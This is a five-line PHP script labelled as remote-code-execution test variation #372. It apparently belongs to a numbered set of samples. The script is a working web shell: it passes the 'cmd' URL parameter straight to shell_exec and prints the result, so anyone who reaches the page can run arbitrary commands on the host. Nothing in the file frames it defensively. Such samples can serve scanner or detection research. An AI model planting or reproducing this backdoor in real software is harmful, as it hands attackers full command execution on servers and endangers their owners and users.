<?php
// RCE test variation #372
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>